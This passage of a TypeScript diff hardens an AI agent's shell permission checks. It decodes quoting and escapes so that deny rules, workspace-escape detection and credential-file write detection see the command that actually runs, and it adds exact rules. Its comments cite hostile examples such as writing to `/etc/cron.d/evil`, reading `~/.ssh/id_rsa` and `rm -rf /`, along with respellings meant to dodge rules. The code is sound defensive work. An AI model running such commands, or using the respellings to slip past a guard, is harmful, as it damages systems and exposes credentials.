@@ -110,19 +110,47 @@ export function permissionSubject(toolName: string, args: Record<string, unknown
 }
 
 /**
- * Split a shell command into whitespace-delimited tokens, honouring single- and
- * double-quoted spans (quotes stripped, contents kept). Good enough to scan
- * arguments for path-like tokens; not a full shell parser (no variable/command
- * substitution, no escape sequences).
+ * Split a shell command into the words bash builds from it: unquoted whitespace
+ * separates words, and the quoted, escaped, and bare pieces between it join into one,
+ * each read as {@link readShellSpan} reads it. So `"cd"k` is the one word `cdk` (not
+ * `cd` and `k`), `\/etc` and `$'\x2fetc'` are `/etc`, and `''` is an empty word. A
+ * backslash-newline joins lines. Not a full shell parser: nothing is expanded, and an
+ * operator stays inside a word it touches (`a>b` is one word).
  */
 function tokenizeShellCommand(command: string): string[] {
-  const tokens: string[] = []
+  const words: string[] = []
+  let word: string | null = null
+  for (let i = 0; i < command.length; ) {
+    if (command[i] === '\\' && command[i + 1] === '\n') {
+      i += 2 // a line continuation: no character, and no word break
+    } else if (/\s/.test(command[i])) {
+      if (word !== null) words.push(word)
+      word = null
+      i += 1
+    } else {
+      const span = readShellSpan(command, i)
+      word = (word ?? '') + (span ? span.text : command[i])
+      i = span ? span.end : i + 1
+    }
+  }
+  if (word !== null) words.push(word)
+  return words
+}
+
+/**
+ * The command split on whitespace, with a span in `"` or `'` kept whole and unwrapped
+ * and every backslash left as written. Not the words bash runs (see
+ * {@link tokenizeShellCommand}), but how a Windows path such as `C:\Users\x` or
+ * `..\..\x` reads, so {@link shellReferencesExternalPath} scans these words too.
+ */
+function plainShellWords(command: string): string[] {
+  const words: string[] = []
   const re = /"([^"]*)"|'([^']*)'|(\S+)/g
   let m: RegExpExecArray | null
   while ((m = re.exec(command)) !== null) {
-    tokens.push(m[1] ?? m[2] ?? m[3] ?? '')
+    words.push(m[1] ?? m[2] ?? m[3] ?? '')
   }
-  return tokens
+  return words
 }
 
 /**
@@ -221,9 +249,10 @@ function isScratchTarget(abs: string): boolean {
  */
 function segmentEscapesWorkspace(seg: string, roots: string[]): boolean {
   if (!seg) return false
-  // A quoted path (`"/etc/shadow"`, `'~/f'`) keeps its quotes when it is glued to a
-  // flag/redirection or sits after `=`, since the tokenizer only strips quotes that
-  // wrap the whole token. Peel a surrounding pair so the value is analysed.
+  // A word can still hold a quote pair: a plain word keeps one glued after `=` or a
+  // redirection (`--file="/etc/x"`), and a bash word holds one as text when it was
+  // escaped or nested (`\"/etc/x\"`, `'"/etc/x"'`), which an `eval` or `sh -c` reads as
+  // quoting. Peel a surrounding pair so the value is analysed.
   seg = stripSurroundingQuotes(seg)
   if (!seg) return false
   const abs = absoluteTarget(seg)
@@ -250,7 +279,10 @@ function segmentEscapesWorkspace(seg: string, roots: string[]): boolean {
  * Whether a `run_shell` command references a filesystem path outside the workspace
  * `roots` — an absolute/home path that resolves outside every root, or a relative
  * path that climbs above the workspace root. Also inspects the value side of an `=`
- * (so env prefixes like `FOO=/etc/x` and flags like `--file=/etc/x` are caught).
+ * (so env prefixes like `FOO=/etc/x` and flags like `--file=/etc/x` are caught). The
+ * words are read as bash builds them (see {@link tokenizeShellCommand}), so quoting or
+ * escaping a path (`$'/etc'`, `\/etc`, `x"/../.."/y`) doesn't hide it, and again with
+ * backslashes kept (see {@link plainShellWords}), so a Windows path is seen too.
  *
  * Best-effort and deliberately conservative: a command that escapes is escalated
  * for approval, never silently auto-run. It can't catch paths hidden behind
@@ -258,7 +290,8 @@ function segmentEscapesWorkspace(seg: string, roots: string[]): boolean {
  * tripwire, not a sandbox. The sandbox remains the real confinement boundary.
  */
 export function shellReferencesExternalPath(command: string, roots: string[]): boolean {
-  for (const token of tokenizeShellCommand(command)) {
+  // Either reading naming an outside path flags the command: over-flagging only asks.
+  for (const token of [...tokenizeShellCommand(command), ...plainShellWords(command)]) {
     if (segmentEscapesWorkspace(token, roots)) return true
     // A redirection glued to its target (`>/etc/cron.d/evil`, `<~/.ssh/id_rsa`,
     // `2>/abs/log`) keeps the operator inside the token; peel it so the path is seen.
@@ -302,45 +335,48 @@ const COMMAND_PREFIXES = new Set(['sudo', 'env', 'command', 'exec', 'nohup', 'ti
  */
 export function shellWritesSensitivePath(command: string): boolean {
   for (const segment of splitShellCommand(command)) {
-    const tokens = tokenizeShellCommand(segment)
-    for (let i = 0; i < tokens.length; i++) {
-      const token = tokens[i]!
-      // Output redirection, spaced (`> .env`) or glued (`>.env`, `2>>.env`). `>&2` is a
-      // descriptor duplication, not a file.
-      if (/^\d*(?:>>|>\||&>>|&>|>)$/.test(token)) {
-        const target = tokens[i + 1]
-        if (target !== undefined && isSensitivePath(stripSurroundingQuotes(target))) return true
-        continue
+    // Bash's words (`\.env` and `".e"nv` are `.env`) and the plain ones (a Windows
+    // path keeps its backslashes): either reading naming a credential file flags it.
+    for (const tokens of [tokenizeShellCommand(segment), plainShellWords(segment)]) {
+      for (let i = 0; i < tokens.length; i++) {
+        const token = tokens[i]!
+        // Output redirection, spaced (`> .env`) or glued (`>.env`, `2>>.env`). `>&2` is a
+        // descriptor duplication, not a file.
+        if (/^\d*(?:>>|>\||&>>|&>|>)$/.test(token)) {
+          const target = tokens[i + 1]
+          if (target !== undefined && isSensitivePath(stripSurroundingQuotes(target))) return true
+          continue
+        }
+        const glued = /^\d*(?:>>|>\||&>>|&>|>)([^&].*)$/.exec(token)
+        if (glued && isSensitivePath(stripSurroundingQuotes(glued[1]!))) return true
       }
-      const glued = /^\d*(?:>>|>\||&>>|&>|>)([^&].*)$/.exec(token)
-      if (glued && isSensitivePath(stripSurroundingQuotes(glued[1]!))) return true
-    }
-    // The command word: past `FOO=bar` assignments and prefixes like `sudo`.
-    let c = 0
-    while (
-      c < tokens.length &&
-      (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[c]!) || COMMAND_PREFIXES.has(tokens[c]!))
-    ) {
-      c++
-    }
-    const word = tokens[c]
-    if (word === undefined) continue
-    const cmd = word.slice(word.lastIndexOf('/') + 1)
-    const args = tokens.slice(c + 1)
-    const namesSensitive = (): boolean =>
-      args.some((a) => {
-        if (a.startsWith('-')) return false
-        // `dd of=.env`, `--target=.env`: the path may follow an `=`.
-        const eq = a.indexOf('=')
-        return isSensitivePath(a) || (eq >= 0 && isSensitivePath(a.slice(eq + 1)))
-      })
-    if (FILE_WRITING_COMMANDS.has(cmd) && namesSensitive()) return true
-    if (
-      IN_PLACE_EDITORS.has(cmd) &&
-      args.some((a) => /^-[A-Za-z]*i/.test(a) || a.startsWith('--in-place')) &&
-      namesSensitive()
-    ) {
-      return true
+      // The command word: past `FOO=bar` assignments and prefixes like `sudo`.
+      let c = 0
+      while (
+        c < tokens.length &&
+        (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[c]!) || COMMAND_PREFIXES.has(tokens[c]!))
+      ) {
+        c++
+      }
+      const word = tokens[c]
+      if (word === undefined) continue
+      const cmd = word.slice(word.lastIndexOf('/') + 1)
+      const args = tokens.slice(c + 1)
+      const namesSensitive = (): boolean =>
+        args.some((a) => {
+          if (a.startsWith('-')) return false
+          // `dd of=.env`, `--target=.env`: the path may follow an `=`.
+          const eq = a.indexOf('=')
+          return isSensitivePath(a) || (eq >= 0 && isSensitivePath(a.slice(eq + 1)))
+        })
+      if (FILE_WRITING_COMMANDS.has(cmd) && namesSensitive()) return true
+      if (
+        IN_PLACE_EDITORS.has(cmd) &&
+        args.some((a) => /^-[A-Za-z]*i/.test(a) || a.startsWith('--in-place')) &&
+        namesSensitive()
+      ) {
+        return true
+      }
     }
   }
   return false
@@ -379,10 +415,10 @@ export function parseTightenOnlyRules(raw: unknown, maxRules: number): Permissio
   for (const r of rules) {
     if (out.length >= maxRules) break
     if (typeof r !== 'object' || r === null) continue
-    const { action, tool, match } = r as Record<string, unknown>
+    const { action, tool, match, exact } = r as Record<string, unknown>
     if (action !== 'deny' && action !== 'ask') continue // never honor `allow` (would loosen)
     if (typeof tool !== 'string' || typeof match !== 'string') continue
-    out.push({ action, tool, match })
+    out.push(exact === true ? { action, tool, match, exact } : { action, tool, match })
   }
   return out
 }
@@ -507,6 +543,25 @@ function globsIntersect(a: string, b: string): boolean {
   return solve(0, 0)
 }
 
+/**
+ * Whether an EXACT rule's `pattern` names `subject` (already canonicalized by kind)
+ * itself: the same resolved path (a relative pattern anchored to each root, as for a
+ * glob), the same URL with scheme and host case-folded, or the same string. `*` is an
+ * ordinary character and nothing extends past the pattern, so an exact `src` covers
+ * the directory entry `src` and not `src/a.ts`. A blank pattern is inert, as for a glob.
+ */
+function exactSubjectMatches(
+  kind: ReturnType<typeof subjectKind>,
+  pattern: string,
+  roots: string[],
+  subject: string
+): boolean {
+  if (!pattern.trim()) return false
+  if (kind === 'path') return candidatePatternPaths(pattern, roots).includes(subject)
+  if (kind === 'url') return lowerUrlAuthority(pattern) === subject
+  return pattern === subject
+}
+
 function patternMatches(pattern: string, subject: string): boolean {
   const p = pattern.trim()
   // An empty pattern matches NOTHING (the rule is inert), not everything — a blank
@@ -525,7 +580,8 @@ function patternMatches(pattern: string, subject: string): boolean {
  * subject and each rule pattern are canonicalized by kind before comparing — URLs
  * case-folded on scheme+host, filesystem paths resolved and anchored to the roots —
  * so a rule can't be dodged (deny) or widened (allow) by a spelling that resolves
- * to the same target.
+ * to the same target. An `exact` rule matches only its one literal subject (see
+ * {@link exactSubjectMatches}).
  */
 function matchOne(
   rules: PermissionRule[],
@@ -539,8 +595,9 @@ function matchOne(
   for (const r of rules) {
     if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
     const match = r.match ?? ''
-    const hit =
-      kind === 'path'
+    const hit = r.exact
+      ? exactSubjectMatches(kind, match, roots, canonSubject)
+      : kind === 'path'
         ? pathPatternMatches(match, roots, canonSubject)
         : kind === 'url'
           ? patternMatches(lowerUrlAuthority(match), canonSubject)
@@ -555,15 +612,160 @@ function normalizeShellCommand(s: string): string {
   return s.replace(/\s+/g, ' ').trim()
 }
 
+/** The single-character escapes of bash's ANSI-C quoting (`$'...'`). */
+const ANSI_C_ESCAPES = new Map([
+  ['a', '\x07'],
+  ['b', '\b'],
+  ['e', '\x1b'],
+  ['E', '\x1b'],
+  ['f', '\f'],
+  ['n', '\n'],
+  ['r', '\r'],
+  ['t', '\t'],
+  ['v', '\v'],
+  ['\\', '\\'],
+  ["'", "'"],
+  ['"', '"'],
+  ['?', '?']
+])
+
+/**
+ * The run of hex digits (at most `max`) at `s[i]`, as its value (wrapping at 32 bits,
+ * like bash's `int`) and the index past it; `n` is how many digits there were.
+ */
+function hexRun(s: string, i: number, max: number): { value: number; n: number; end: number } {
+  let value = 0
+  let n = 0
+  while (n < max && i < s.length && /[0-9A-Fa-f]/.test(s[i])) {
+    value = (value * 16 + parseInt(s[i], 16)) >>> 0
+    n += 1
+    i += 1
+  }
+  return { value, n, end: i }
+}
+
+/**
+ * Decode the body of a bash ANSI-C quoted string (`$'...'`) the way bash does: the C
+ * escapes in {@link ANSI_C_ESCAPES}, octal `\nnn`, hex `\xHH` and `\x{H...}`,
+ * `\uHHHH`, `\UHHHHHHHH`, and `\cX` (control-X). An unknown escape keeps its backslash,
+ * and a NUL ends the string, as in bash.
+ */
+function decodeAnsiC(body: string): string {
+  let out = ''
+  const emit = (code: number): boolean => {
+    if (code === 0) return false
+    out += String.fromCharCode(code)
+    return true
+  }
+  for (let i = 0; i < body.length; ) {
+    if (body[i] !== '\\' || i + 1 >= body.length) {
+      out += body[i]
+      i += 1
+      continue
+    }
+    const e = body[i + 1]
+    i += 2
+    const simple = ANSI_C_ESCAPES.get(e)
+    if (simple !== undefined) {
+      out += simple
+    } else if (e >= '0' && e <= '7') {
+      let code = Number(e)
+      for (let k = 0; k < 2 && i < body.length && body[i] >= '0' && body[i] <= '7'; k++, i++) {
+        code = code * 8 + Number(body[i])
+      }
+      if (!emit(code & 0xff)) break
+    } else if (e === 'x') {
+      const braced = body[i] === '{'
+      const run = hexRun(body, braced ? i + 1 : i, braced ? Infinity : 2)
+      if (!braced && run.n === 0) {
+        out += '\\x' // no hex digit: kept as written
+        continue
+      }
+      i = braced && body[run.end] === '}' ? run.end + 1 : run.end
+      if (!emit(run.value & 0xff)) break
+    } else if (e === 'u' || e === 'U') {
+      const run = hexRun(body, i, e === 'u' ? 4 : 8)
+      const v = run.value
+      // A value that is no character (none, a surrogate, past U+10FFFF) stays as written.
+      if (run.n === 0 || (v >= 0xd800 && v <= 0xdfff) || v > 0x10ffff) {
+        out += body.slice(i - 2, run.end)
+      } else if (v === 0) {
+        break
+      } else {
+        out += String.fromCodePoint(v)
+      }
+      i = run.end
+    } else if (e === 'c' && i < body.length) {
+      const x = body[i]
+      i += x === '\\' && body[i + 1] === '\\' ? 2 : 1 // `\c\\` is control-backslash
+      if (!emit(x === '?' ? 0x7f : x.charCodeAt(0) & 0x1f)) break
+    } else {
+      out += `\\${e}`
+    }
+  }
+  return out
+}
+
+/**
+ * The ANSI-C quoted string `$'...'` whose `$` is at `s[start]`: its decoded text (see
+ * {@link decodeAnsiC}) and the index past its closing quote. A backslash pairs with the
+ * next character first, so `\'` does not close it.
+ */
+function readAnsiCQuote(s: string, start: number): { text: string; end: number } {
+  let j = start + 2
+  while (j < s.length && s[j] !== "'") j += s[j] === '\\' ? 2 : 1
+  return { text: decodeAnsiC(s.slice(start + 2, Math.min(j, s.length))), end: Math.min(j + 1, s.length) }
+}
+
+/**
+ * The quoted or escaped span of shell text that starts at `s[i]`, read as the shell
+ * reads it, and the index past it; null when `s[i]` is an ordinary character. A
+ * backslash escapes the next character (and is dropped); single quotes are literal; in
+ * double quotes a backslash escapes only `"`, `` ` ``, `$`, `\`, and newline. A `$'...'`
+ * string is decoded (see {@link decodeAnsiC}), and a `$"..."` one reads as the plain
+ * double-quoted string (its text untranslated). `$$` is the shell's PID, read as a pair
+ * so the `'` after it opens a plain single-quoted string. An unclosed quote runs to the
+ * end of `s`.
+ */
+function readShellSpan(s: string, i: number): { text: string; end: number } | null {
+  const c = s[i]
+  if (c === '$') {
+    if (s[i + 1] === '$') return { text: '$$', end: i + 2 }
+    if (s[i + 1] === "'") return readAnsiCQuote(s, i)
+    if (s[i + 1] === '"') return readShellSpan(s, i + 1)
+    return null
+  }
+  if (c === '\\') return { text: s[i + 1] ?? '', end: i + 2 }
+  if (c === "'") {
+    const close = s.indexOf("'", i + 1)
+    return close === -1 ? { text: s.slice(i + 1), end: s.length } : { text: s.slice(i + 1, close), end: close + 1 }
+  }
+  if (c !== '"') return null
+  let text = ''
+  let j = i + 1
+  while (j < s.length && s[j] !== '"') {
+    if (s[j] === '\\' && j + 1 < s.length && '"`$\\\n'.includes(s[j + 1])) {
+      text += s[j + 1]
+      j += 2
+    } else {
+      text += s[j]
+      j += 1
+    }
+  }
+  return { text, end: j + 1 }
+}
+
 /**
  * Reduce a shell command to the logical text the shell would execute, by stripping
- * quotes and resolving backslash escapes: `"rm"`, `r''m`, `\rm`, and `rm -r"f"` all
- * collapse to `rm`. Without this, a deny rule like `*rm -rf*` is trivially dodged by
- * quoting the program name — the literal command string no longer contains the token
- * `rm -rf`, so the pattern never fires. Applied to BOTH the rule pattern and the
- * command before matching, so a rule the user deliberately wrote with quotes (e.g.
- * `git commit -m "*"`) still matches. The `*` wildcard survives (it's an ordinary
- * character here — a rule pattern's `*` stays a wildcard for {@link globMatches}).
+ * quotes and resolving backslash escapes (see {@link readShellSpan}): `"rm"`, `r''m`,
+ * `\rm`, `$'\x72m'`, and `rm -r"f"` all collapse to `rm`. Without this, a deny rule
+ * like `*rm -rf*` is trivially dodged by quoting the program name — the literal
+ * command string no longer contains the token `rm -rf`, so the pattern never fires.
+ * Applied to BOTH a deny or ask rule's pattern and the command before matching, so a
+ * rule the user deliberately wrote with quotes still matches. The `*` wildcard
+ * survives (it's an ordinary character here — a rule pattern's `*` stays a wildcard
+ * for {@link globMatches}). An allow rule reads the command with
+ * {@link literalShellUnits} instead, which keeps a quoted `*` apart from a bare one.
  *
  * Not a full shell parser: it strips quoting/escaping so the matcher sees through
  * spelling tricks, and runs per leaf sub-command AFTER {@link splitShellCommand}
@@ -573,50 +775,20 @@ function normalizeShellCommand(s: string): string {
 function dequoteShell(s: string): string {
   let out = ''
   for (let i = 0; i < s.length; ) {
-    const c = s[i]
-    if (c === '\\') {
-      // Backslash escapes the next char (outside quotes); drop the backslash, keep the char.
-      if (i + 1 < s.length) {
-        out += s[i + 1]
-        i += 2
-      } else {
-        i += 1
-      }
-    } else if (c === '"') {
-      i += 1
-      while (i < s.length && s[i] !== '"') {
-        // Inside double quotes a backslash only escapes " ` $ \ (and newline); otherwise literal.
-        if (s[i] === '\\' && i + 1 < s.length && '"`$\\\n'.includes(s[i + 1])) {
-          out += s[i + 1]
-          i += 2
-        } else {
-          out += s[i]
-          i += 1
-        }
-      }
-      i += 1 // skip the closing quote (or run off the end on an unbalanced quote)
-    } else if (c === "'") {
-      i += 1 // single quotes are literal — no escapes inside
-      while (i < s.length && s[i] !== "'") {
-        out += s[i]
-        i += 1
-      }
-      i += 1 // skip the closing quote
-    } else {
-      out += c
-      i += 1
-    }
+    const span = readShellSpan(s, i)
+    out += span ? span.text : s[i]
+    i = span ? span.end : i + 1
   }
   return out
 }
 
 /**
- * Match a permission pattern against a shell command. `*` matches any run of
- * characters including `/` (a command is not a path — `/` is just a character),
- * so a deny rule like `*rm -rf*` fires on `rm -rf /tmp/x`. Both sides are first
- * reduced past quoting/escaping (see {@link dequoteShell}) so the rule matches on
- * what actually runs, not how it was spelled. Falls back to a prefix match for
- * convenience ("git" matches "git status").
+ * Match a deny or ask pattern against a shell command (an allow uses
+ * {@link shellAllowMatches}). `*` matches any run of characters including `/` (a
+ * command is not a path — `/` is just a character), so a deny rule like `*rm -rf*`
+ * fires on `rm -rf /tmp/x`. Both sides are first reduced past quoting/escaping (see
+ * {@link dequoteShell}) so the rule matches on what actually runs, not how it was
+ * spelled. Falls back to a prefix match for convenience ("git" matches "git status").
  */
 function shellCommandMatches(pattern: string, command: string): boolean {
   // An empty pattern matches nothing (inert rule), not every command — check the
@@ -630,11 +802,182 @@ function shellCommandMatches(pattern: string, command: string): boolean {
   return c === p || c.startsWith(`${p} `)
 }
 
-/** First matching rule's action for a single shell sub-command, or null. */
+/**
+ * Whether an EXACT shell rule's `pattern` is `command` itself, compared on what runs
+ * (dequoted, whitespace collapsed) like {@link shellCommandMatches}, but with `*` an
+ * ordinary character and no prefix extension. A blank pattern is inert.
+ */
+function shellCommandEquals(pattern: string, command: string): boolean {
+  if (!pattern.trim()) return false
+  return normalizeShellCommand(dequoteShell(pattern)) === normalizeShellCommand(dequoteShell(command))
+}
+
+/**
+ * Characters that mean the same to the shell quoted or not, in any position: letters,
+ * digits, `_ - . / , : + @ % ^`, and anything non-ASCII. Every other character can
+ * change what runs once its quotes come off: whitespace splits a word, `* ? [` glob,
+ * `~` and `$` expand, `{` brace-expands, `< >` redirect, `=` assigns, `#` comments.
+ */
+const SHELL_INERT_CHAR = /^[A-Za-z0-9_\-./,:+@%^\u0080-￿]$/
+
+/**
+ * How an ALLOW rule reads a shell command, as a list of units that join into its
+ * canonical text. Quotes and backslash escapes come off as in {@link dequoteShell}, so
+ * `"rm"`, `r''m`, and `\rm` all read `rm`, but a quoted or escaped character that is
+ * not {@link SHELL_INERT_CHAR inert} stays marked as literal (the unit `\c`), and a
+ * `$` inside double quotes, which still expands but is not split or globbed, is the
+ * unit `"$`. A literal backslash is `\\` and a literal `"` is `\"`, so every unit of two
+ * characters starts with `\` or `"` and no other unit is either, and the reading is
+ * one-to-one: `rm '*'` (one file named `*`) is `rm \*` and never `rm *` (every file),
+ * and `rm -rf '~'` is never `rm -rf ~`.
+ *
+ * {@link dequoteShell} folds these together on purpose, for deny and ask rules: a
+ * respelling must not dodge a deny, and reading too much as the same only blocks
+ * more. An allow needs the opposite, since whatever it folds together it approves.
+ *
+ * A `$'...'` string is decoded as in {@link dequoteShell} and its characters read like
+ * any other quoted ones, so `$'\x72m'` is `rm` but `$'*'` is the literal `\*`. A
+ * `$"..."` string can be translated into other text when it runs, so its units sit
+ * between the markers `"(` and `")` and it reads as itself only.
+ *
+ * Unquoted whitespace is collapsed and trimmed (see {@link normalizeShellCommand}); a
+ * quoted space is the unit `\ `. A word that is only empty quotes (`''`, `""`, `$''`)
+ * is still a word to the shell, an empty one, so it is the unit `""` and never folds
+ * away: `'' rm -rf /` runs no `rm` at all, and `rm '' -rf x` passes `rm` an empty
+ * argument. Empty quotes inside a word add nothing to it (`r''m` is `rm`).
+ */
+function literalShellUnits(s: string): string[] {
+  const units: string[] = []
+  const literal = (c: string): void => {
+    units.push(SHELL_INERT_CHAR.test(c) ? c : `\\${c}`)
+  }
+  // Where the current word's units start, and whether it holds a quoted span.
+  let wordStart = 0
+  let quoted = false
+  const endWord = (): void => {
+    if (quoted && units.length === wordStart) units.push('""')
+    quoted = false
+  }
+  const text = normalizeShellCommand(s)
+  // The double-quoted string opening at `text[i]`; returns the index past its close.
+  const doubleQuoted = (i: number): number => {
+    for (i += 1; i < text.length && text[i] !== '"'; ) {
+      if (text[i] === '\\' && i + 1 < text.length && '"`$\\\n'.includes(text[i + 1])) {
+        literal(text[i + 1])
+        i += 2
+      } else {
+        if (text[i] === '$') units.push('"$')
+        else literal(text[i])
+        i += 1
+      }
+    }
+    return i + 1
+  }
+  for (let i = 0; i < text.length; ) {
+    const c = text[i]
+    if (c === '$' && text[i + 1] === '$') {
+      units.push('$', '$')
+      i += 2
+    } else if (c === '$' && text[i + 1] === "'") {
+      const q = readAnsiCQuote(text, i)
+      for (let k = 0; k < q.text.length; k++) literal(q.text[k])
+      quoted = true
+      i = q.end
+    } else if (c === '$' && text[i + 1] === '"') {
+      units.push('"(')
+      i = doubleQuoted(i + 1)
+      units.push('")')
+    } else if (c === '\\') {
+      if (i + 1 < text.length) literal(text[i + 1])
+      i += 2
+    } else if (c === '"') {
+      i = doubleQuoted(i)
+      quoted = true
+    } else if (c === "'") {
+      i += 1
+      while (i < text.length && text[i] !== "'") {
+        literal(text[i])
+        i += 1
+      }
+      quoted = true
+      i += 1
+    } else if (c === ' ') {
+      endWord()
+      if (units.length && units[units.length - 1] !== ' ') units.push(' ')
+      wordStart = units.length
+      i += 1
+    } else {
+      units.push(c)
+      i += 1
+    }
+  }
+  endWord()
+  if (units[units.length - 1] === ' ') units.pop()
+  return units
+}
+
+/**
+ * Any run of whole {@link literalShellUnits} units: a marked `\c` or a `"`-led unit is
+ * never split, so a wildcard can't stop inside one and leave the rest of the pattern
+ * matching out of step with the command's units.
+ */
+const SHELL_UNITS_RE = String.raw`(?:[\\"][\s\S]|[^\\"])*`
+
+/** Whether a {@link literalShellUnits} unit is a `*`, which an allow pattern reads as its wildcard. */
+function isShellStarUnit(u: string | undefined): boolean {
+  return u === '*' || u === '\\*'
+}
+
+/**
+ * {@link shellCommandMatches} for an ALLOW rule: the pattern and the command are
+ * compared as {@link literalShellUnits}, so a quoted `*` or `~` in the command is not
+ * the bare one a pattern names (`rm -rf '~'` covers `rm -rf '~' x`, never `rm -rf ~`).
+ * Every `*` in the pattern is still its wildcard, quoted or not, so a hand-written
+ * `git commit -m "*"` covers any message; a literal `*` takes an exact rule.
+ */
+function shellAllowMatches(pattern: string, command: string): boolean {
+  if (!pattern.trim()) return false
+  const p = literalShellUnits(pattern)
+  if (!p.length) return false
+  const c = literalShellUnits(command).join('')
+  let re = ''
+  for (const [i, u] of p.entries()) {
+    if (!isShellStarUnit(u)) re += escapeRegExp(u)
+    else if (!isShellStarUnit(p[i - 1])) re += SHELL_UNITS_RE
+  }
+  if (new RegExp(`^${re}$`).test(c)) return true
+  const prefix = p.join('')
+  return c === prefix || c.startsWith(`${prefix} `)
+}
+
+/**
+ * {@link shellCommandEquals} for an ALLOW rule: the same command read as
+ * {@link literalShellUnits}, so an exact `rm '*'` never allows `rm *`.
+ */
+function shellAllowEquals(pattern: string, command: string): boolean {
+  if (!pattern.trim()) return false
+  const p = literalShellUnits(pattern).join('')
+  return p !== '' && p === literalShellUnits(command).join('')
+}
+
+/**
+ * First matching rule's action for a single shell sub-command, or null. An allow rule
+ * reads the command as {@link literalShellUnits}, a deny or ask rule as
+ * {@link dequoteShell}: a quoted `*` or `~` is the bare one to a deny, never to an allow.
+ */
 function matchOneShell(rules: PermissionRule[], command: string): PermissionRule['action'] | null {
   for (const r of rules) {
     if (r.tool && r.tool !== '*' && r.tool !== 'run_shell') continue
-    if (shellCommandMatches(r.match ?? '', command)) return r.action
+    const match = r.match ?? ''
+    const hit =
+      r.action === 'allow'
+        ? r.exact
+          ? shellAllowEquals(match, command)
+          : shellAllowMatches(match, command)
+        : r.exact
+          ? shellCommandEquals(match, command)
+          : shellCommandMatches(match, command)
+    if (hit) return r.action
   }
   return null
 }
@@ -661,9 +1004,24 @@ function matchOneShell(rules: PermissionRule[], command: string): PermissionRule
  * not `do rm -rf ~` (which a deny on `rm` missed and a junk allow on `do` approved).
  */
 export function splitShellCommand(command: string): string[] {
-  const segments: string[] = []
+  return shellSegments(command).map((s) => s.text)
+}
+
+/** A sub-command {@link splitShellCommand} yields, and where its text came from. */
+interface ShellSegment {
+  text: string
+  /**
+   * A substitution was lifted out of this sub-command, leaving a blank where its output
+   * goes, so the text no longer shows what bash runs: `cd $(echo ~/).ssh` reads `cd .ssh`.
+   */
+  lifted: boolean
+}
+
+/** {@link splitShellCommand}, with each sub-command's {@link ShellSegment.lifted} flag. */
+function shellSegments(command: string): ShellSegment[] {
+  const segments: ShellSegment[] = []
   collectShellSegments(command, segments, 0)
-  return segments.length ? segments : [command.trim()]
+  return segments.length ? segments : [{ text: command.trim(), lifted: false }]
 }
 
 /**
@@ -686,7 +1044,7 @@ const MAX_SUBST_DEPTH = 32
  * then split the residual on the shell control operators. Nested parens are
  * balanced so substitution boundaries are found correctly.
  */
-function collectShellSegments(command: string, segments: string[], depth: number): void {
+function collectShellSegments(command: string, segments: ShellSegment[], depth: number): void {
   const recurse = (inner: string): void => {
     if (depth < MAX_SUBST_DEPTH) {
       collectShellSegments(inner, segments, depth + 1)
@@ -694,10 +1052,11 @@ function collectShellSegments(command: string, segments: string[], depth: number
       // Too deep to keep expanding — surface the body opaquely so it still can't
       // match a narrow allow rule (over-segment ⇒ stricter, never looser).
       const t = inner.trim()
-      if (t) segments.push(t)
+      if (t) segments.push({ text: t, lifted: false })
     }
   }
   let outer = ''
+  const blanks: number[] = [] // where in `outer` a lifted substitution left its blank
   for (let i = 0; i < command.length; ) {
     const two = command.slice(i, i + 2)
     if (two === '$(' || two === '<(' || two === '>(') {
@@ -706,20 +1065,24 @@ function collectShellSegments(command: string, segments: string[], depth: number
         // Unbalanced (a shell syntax error) — treat the rest as a command body too
         // so nothing hides behind the unterminated opener, then stop scanning.
         recurse(command.slice(i + 2))
+        blanks.push(outer.length)
         outer += ' '
         break
       }
       recurse(command.slice(i + 2, close))
+      blanks.push(outer.length)
       outer += ' '
       i = close + 1
     } else if (command[i] === '`') {
       const close = command.indexOf('`', i + 1)
       if (close === -1) {
         recurse(command.slice(i + 1))
+        blanks.push(outer.length)
         outer += ' '
         break
       }
       recurse(command.slice(i + 1, close))
+      blanks.push(outer.length)
       outer += ' '
       i = close + 1
     } else {
@@ -727,10 +1090,18 @@ function collectShellSegments(command: string, segments: string[], depth: number
       i += 1
     }
   }
-  for (const part of outer.split(SHELL_CONTROL_OPERATOR)) {
-    const p = stripShellScaffolding(part)
-    if (p) segments.push(p)
+  // Split as `outer.split(SHELL_CONTROL_OPERATOR)` would, keeping each part's offsets.
+  const operator = new RegExp(SHELL_CONTROL_OPERATOR.source, 'g')
+  let start = 0
+  const push = (end: number): void => {
+    const text = stripShellScaffolding(outer.slice(start, end))
+    if (text) segments.push({ text, lifted: blanks.some((b) => b >= start && b < end) })
   }
+  for (let m = operator.exec(outer); m !== null; m = operator.exec(outer)) {
+    push(m.index)
+    start = m.index + m[0].length
+  }
+  push(outer.length)
 }
 
 /** Reserved words / grouping that may precede a command without being one. */
@@ -786,13 +1157,66 @@ function matchClosingParen(s: string, open: number): number {
   return -1
 }
 
-/** Directory-change builtins whose only effect is the cwd — never worth a rule. */
+/** Directory-change builtins: their only effect is the cwd. */
 const CWD_BUILTINS = new Set(['cd', 'pushd', 'popd'])
 
-/** Whether a sub-command is a bare directory change (`cd`/`pushd`/`popd`). */
+/**
+ * Whether a sub-command runs a directory-change builtin (`cd`/`pushd`/`popd`), judged on
+ * the word bash runs: `"cd"k` is the program `cdk`, while `\cd` and `$'cd'` are `cd`.
+ */
 function isCwdOnly(command: string): boolean {
   const first = tokenizeShellCommand(command)[0]
   return first !== undefined && CWD_BUILTINS.has(first)
+}
+
+/**
+ * A character that makes bash expand, split, or redirect a word (`$`, a backtick, a
+ * glob, a brace, an operator, a `#` comment), or that a word holds only when it was
+ * quoted or escaped (a blank, a backslash, a quote).
+ */
+const SHELL_EXPANDING_CHAR = /[\s$`*?[\]{}()<>|&;!#\\'"]/
+
+/**
+ * Whether a `cd` or `pushd`, given as bash words, names the directory it moves to in
+ * its words alone: exactly one argument after any `--` (and `-L` / `-P` on `cd`), with
+ * nothing bash would expand. Otherwise bash takes the directory from somewhere the
+ * escape check can't see: a bare `cd` goes to `$HOME`; `cd -` and `~-` to `$OLDPWD`;
+ * `~+` is `$PWD` and `~user` another home; `$PWD/..` and a substitution expand; `.[.]`
+ * and `{..,}` expand to `..`; and a `popd`, or a `pushd` with no directory, takes one
+ * off the directory stack. While `CDPATH` is set, bash looks a relative name up there
+ * before the cwd, so only a name led by `/`, `./`, or `../` (or `.`, `..`, `~`) counts.
+ */
+function namesItsDirectory(words: string[]): boolean {
+  const [prog, ...args] = words
+  if (prog !== 'cd' && prog !== 'pushd') return false
+  let i = 0
